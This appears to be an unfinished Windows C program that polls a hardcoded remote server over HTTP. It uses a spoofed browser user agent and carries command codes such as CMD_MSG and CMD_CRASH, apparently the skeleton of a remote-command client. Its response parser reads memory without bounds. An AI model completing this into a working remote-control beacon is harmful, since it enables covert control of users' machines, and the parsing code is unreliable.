#include <stdlib.h>
#include <stdio.h>
#include <ws2tcpip.h>
#include <winsock2.h>
#include <Windows.h>
#pragma comment(lib, "user32")
#pragma comment(lib, "Ws2_32.lib")
enum SERVER_COMMAND {
    CMD_MSG,
    CMD_CRASH
};

#define HOST "000webhostapp.com"


void ShowMsg(char* Title, char* Msg) {
    MessageBoxA(NULL, Msg, Title, MB_OK);
}

char req[2048] = {0};
char response[0x20002] = {0};
char* uagent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36";
void TcpInit() {
    WSADATA WsaData;
    int res = WSAStartup(MAKEWORD(2, 2), &WsaData);
    if(res != 0) exit(-1);
}

int uid = 9999;


void ServerRequest(int Cmd, char* arg0, char* arg1, char** Buffer) {
    SOCKET Socket;
    PADDRINFOA addr;

    int res = getaddrinfo("145.14.145.86", "80", 0, &addr);
    if(res != 0) exit(-2);

    Socket = socket(addr->ai_family, addr->ai_socktype, addr->ai_protocol);
    if(Socket == INVALID_SOCKET) exit(-3);


    sprintf_s(req, 2048, "POST /?cmd=%d&uid=%d HTTP/1.1\nUser-Agent: %s\nconnection: close\ncontent-length:0\nhost: molakimtaypointi.000webhostapp.com\naccept:*/*\n\n", Cmd, uid, uagent);
    
    res = connect(Socket, addr->ai_addr, addr->ai_addrlen);
    if(res != 0) exit(-4);
    send(Socket, req, strlen(req), 0);
    int length;
    recv(Socket, response, 0x20000, 0);
    closesocket(Socket);
    char* b = response;
    for(;;) {
        if(memcmp(b, "\r\n\r\n", 4) == 0) {
            b+=2;
            break;
        }else b++;
    }
    *Buffer = b;
}

// returns RequestedCmd (-1 if no cmd is pending)
int QueryPendingCmd() {

}


// int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPWSTR lpCmdLine, int nCmdShow) {
    int main() {
    TcpInit();
    char* buff;
    ServerRequest(100, "", "", &buff);
        printf("res : %s\n", buff);

    ServerRequest(99, "", "", &buff);

        printf("res2 : %s\n", buff);

    MessageBoxW(NULL, L"A fin a...", L"Message", MB_OK);
    return 0;
}